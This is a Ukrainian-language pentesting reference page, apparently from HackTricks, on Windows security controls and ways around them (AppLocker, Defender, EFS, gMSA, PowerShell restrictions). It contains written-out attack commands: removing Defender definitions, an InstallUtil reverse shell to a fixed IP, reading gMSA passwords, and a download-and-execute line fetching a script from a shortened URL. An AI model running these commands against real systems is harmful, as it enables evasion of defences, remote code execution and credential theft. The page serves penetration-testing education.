# Засоби контролю безпеки Windows

{{#include ../banners/hacktricks-training.md}}

## Політика AppLocker

Білий список застосунків — це перелік схвалених програм або виконуваних файлів, яким дозволено бути присутніми в системі та запускатися в ній. Мета полягає в захисті середовища від шкідливого malware і несхваленого програмного забезпечення, яке не відповідає конкретним бізнес-потребам організації.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) — це **рішення Microsoft для внесення застосунків до білого списку**, яке надає системним адміністраторам контроль над тим, **які застосунки та файли можуть запускати користувачі**. Воно забезпечує **детальний контроль** над виконуваними файлами, скриптами, файлами інсталятора Windows, DLL, упакованими застосунками та інсталяторами упакованих застосунків.\
Організації часто **блокують cmd.exe і PowerShell.exe**, а також доступ на запис до певних каталогів, **але все це можна обійти**.

### Перевірка

Перевірте, які файли/розширення внесені до чорного/білого списку:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Цей шлях реєстру містить конфігурації та політики, застосовані AppLocker, що дає змогу переглянути поточний набір правил, enforced у системі:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Корисні **каталоги з правом запису** для обходу політики AppLocker: якщо AppLocker дозволяє виконувати будь-що всередині `C:\Windows\System32` або `C:\Windows`, існують **каталоги з правом запису**, які можна використати, щоб **обійти це**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Загальновідомі **trusted** бінарні файли [**"LOLBAS's"**](https://lolbas-project.github.io/) також можуть бути корисними для обходу AppLocker.
- **Правила, написані неналежним чином, також можна обійти**
- Наприклад, для **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** можна створити **папку з назвою `allowed`** будь-де, і вона буде дозволена.
- Організації також часто зосереджуються на **блокуванні виконуваного файлу `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, але забувають про **інші** [**місця розташування виконуваних файлів PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), такі як `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` або `PowerShell_ISE.exe`.
- **Застосування правил до DLL дуже рідко вмикають** через додаткове навантаження, яке це може створити для системи, а також через великий обсяг тестування, необхідний для гарантування, що нічого не зламається. Тому використання **DLL як бекдорів допоможе обійти AppLocker**.
- Ви можете використовувати [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) або [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), щоб **виконувати** код **Powershell** у будь-якому процесі та обходити AppLocker. Докладніше дивіться: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Зберігання облікових даних

### Security Accounts Manager (SAM)

Локальні облікові дані містяться в цьому файлі, паролі хешовані.

### Local Security Authority (LSA) - LSASS

**Облікові дані** (хешовані) **зберігаються** в **пам'яті** цієї підсистеми для Single Sign-On.\
**LSA** адмініструє локальну **політику безпеки** (політику паролів, дозволи користувачів...), **автентифікацію**, **токени доступу**...\
LSA перевіряє **надані облікові дані** у файлі **SAM** (для локального входу) та **взаємодіє** з **контролером домену**, щоб автентифікувати користувача домену.

**Облікові дані** **зберігаються** всередині **процесу LSASS**: квитки Kerberos, хеші NT і LM, паролі, які легко розшифрувати.

### Секрети LSA

LSA може зберігати деякі облікові дані на диску:

- Пароль облікового запису комп'ютера в Active Directory (недоступний контролер домену).
- Паролі облікових записів служб Windows
- Паролі для запланованих завдань
- Інше (пароль застосунків IIS...)

### NTDS.dit

Це база даних Active Directory. Вона присутня лише на контролерах домену.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) — це Antivirus, доступний у Windows 10 і Windows 11, а також у версіях Windows Server. Він **блокує** поширені інструменти pentesting, такі як **`WinPEAS`**. Однак існують способи **обійти ці засоби захисту**.

### Перевірка

Щоб перевірити **стан** **Defender**, можна виконати PS cmdlet **`Get-MpComputerStatus`** (перевірте значення **`RealTimeProtectionEnabled`**, щоб дізнатися, чи активний він):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Щоб також отримати його перелік, можна виконати:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Зашифрована файлова система (EFS)

EFS захищає файли за допомогою шифрування, використовуючи **симетричний ключ**, відомий як **File Encryption Key (FEK)**. Цей ключ шифрується за допомогою **відкритого ключа** користувача та зберігається в **альтернативному потоці даних** $EFS зашифрованого файлу. Коли потрібне розшифрування, відповідний **закритий ключ** цифрового сертифіката користувача використовується для розшифрування FEK із потоку $EFS. Докладнішу інформацію можна знайти [тут](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Сценарії розшифрування без ініціації користувача** включають:

- Коли файли або папки переміщуються до файлової системи без EFS, наприклад [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), вони автоматично розшифровуються.
- Зашифровані файли, надіслані мережею через протокол SMB/CIFS, розшифровуються перед передаванням.

Цей метод шифрування забезпечує **прозорий доступ** власника до зашифрованих файлів. Однак просте змінення пароля власника та вхід до системи не дозволить виконати розшифрування.

**Основні висновки**:

- EFS використовує симетричний FEK, зашифрований відкритим ключем користувача.
- Для розшифрування використовується закритий ключ користувача, щоб отримати доступ до FEK.
- Автоматичне розшифрування відбувається за певних умов, наприклад під час копіювання до FAT32 або мережевого передавання.
- Зашифровані файли доступні власнику без додаткових дій.

### Перевірка інформації EFS

Перевірте, чи **користувач** **використовував** цю **службу**, перевіривши, чи існує цей шлях:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Перевірте, **хто** має **доступ** до файлу, використовуючи cipher /c \<file>\
Також можна використовувати `cipher /e` і `cipher /d` у папці, щоб **зашифрувати** та **розшифрувати** всі файли

### Розшифрування файлів EFS

#### Будучи Authority System

Цей спосіб вимагає, щоб **користувач-жертва** **запустив** **процес** на **хості**. Якщо це так, використовуючи сесії `meterpreter`, можна імперсонувати токен процесу користувача (`impersonate_token` з `incognito`). Або можна просто виконати `migrate` до процесу користувача.

#### Знаючи пароль користувача

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft розробила **Group Managed Service Accounts (gMSA)** для спрощення керування службовими обліковими записами в IT-інфраструктурах. На відміну від традиційних службових облікових записів, для яких часто ввімкнено параметр "**Password never expire**", gMSA забезпечують безпечніше рішення, яким простіше керувати:

- **Автоматичне керування паролями**: gMSA використовують складний пароль довжиною 240 символів, який автоматично змінюється відповідно до політики домену або комп'ютера. Цей процес обробляється Microsoft's Key Distribution Service (KDC), що усуває потребу в ручному оновленні паролів.
- **Підвищена безпека**: ці облікові записи захищені від блокування та не можуть використовуватися для інтерактивного входу, що підвищує їхню безпеку.
- **Підтримка кількох хостів**: gMSA можна спільно використовувати на кількох хостах, що робить їх ідеальними для служб, які працюють на кількох серверах.
- **Можливість запуску запланованих завдань**: на відміну від managed service accounts, gMSA підтримують запуск запланованих завдань.
- **Спрощене керування SPN**: система автоматично оновлює Service Principal Name (SPN), коли змінюються відомості sAMaccount або DNS-ім'я комп'ютера, що спрощує керування SPN.

Паролі gMSA зберігаються у властивості LDAP _**msDS-ManagedPassword**_ і автоматично скидаються кожні 30 днів контролерами домену (DC). Цей пароль, зашифрований блок даних, відомий як [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), можуть отримати лише авторизовані адміністратори та сервери, на яких встановлено gMSA, що забезпечує безпечне середовище. Для доступу до цієї інформації потрібне захищене з'єднання, наприклад LDAPS, або з'єднання має бути автентифіковане за допомогою 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)

Цей пароль можна прочитати за допомогою [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Знайдіть більше інформації в цій публікації**](https://cube0x0.github.io/Relaying-for-gMSA/)

Також перегляньте цю [вебсторінку](https://cube0x0.github.io/Relaying-for-gMSA/) про те, як виконати **NTLM relay attack**, щоб **прочитати** **пароль** **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

**Local Administrator Password Solution (LAPS)**, доступний для завантаження з [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), дає змогу керувати паролями локального Administrator. Ці **рандомізовані**, унікальні паролі, які **регулярно змінюються**, централізовано зберігаються в Active Directory. Доступ до цих паролів обмежується за допомогою ACL лише для авторизованих користувачів. За наявності достатніх дозволів можна отримати можливість читати паролі локального адміністратора.

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **блокує багато функцій**, необхідних для ефективного використання PowerShell, зокрема блокування COM-об’єктів, дозвіл лише схвалених типів .NET, робочі процеси на основі XAML, класи PowerShell та багато іншого.

### **Перевірка**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
У сучасних версіях Windows цей Bypass не працюватиме, але можна використовувати [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Для його компіляції може знадобитися** **додати** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> додати `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` і **змінити проєкт на .Net4.5**.

#### Прямий Bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Ви можете використовувати [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) або [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), щоб **виконувати код Powershell** у будь-якому процесі та обходити constrained mode. Докладніше дивіться: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Політика виконання PS

За замовчуванням встановлено значення **restricted.** Основні способи обійти цю політику:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Більше інформації можна знайти [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Інтерфейс постачальника підтримки безпеки (SSPI)

Це API, який можна використовувати для автентифікації користувачів.

SSPI відповідає за пошук відповідного протоколу для двох машин, які хочуть обмінюватися даними. Бажаним методом для цього є Kerberos. Потім SSPI узгоджує, який протокол автентифікації буде використовуватися. Ці протоколи автентифікації називаються Security Support Provider (SSP), розташовані на кожній машині Windows у вигляді DLL, і обидві машини повинні підтримувати один і той самий протокол, щоб мати змогу взаємодіяти.

### Основні SSP

- **Kerberos**: Бажаний варіант
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** і **NTLMv2**: З міркувань сумісності
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Вебсервери та LDAP, пароль у формі MD5-хешу
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL і TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Використовується для узгодження протоколу, який буде застосовано (Kerberos або NTLM, причому Kerberos є стандартним варіантом)
- %windir%\Windows\System32\lsasrv.dll

#### Узгодження може запропонувати кілька методів або лише один.

## UAC - Контроль облікових записів користувачів

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) — це функція, яка вмикає **запит підтвердження для дій із підвищеними привілеями**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## References

- [1] [Bypassing Applocker and Powershell contstrained language mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [howto ~ decrypt EFS files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying for gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 Ways to Bypass the PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

{{#include ../banners/hacktricks-training.md}}
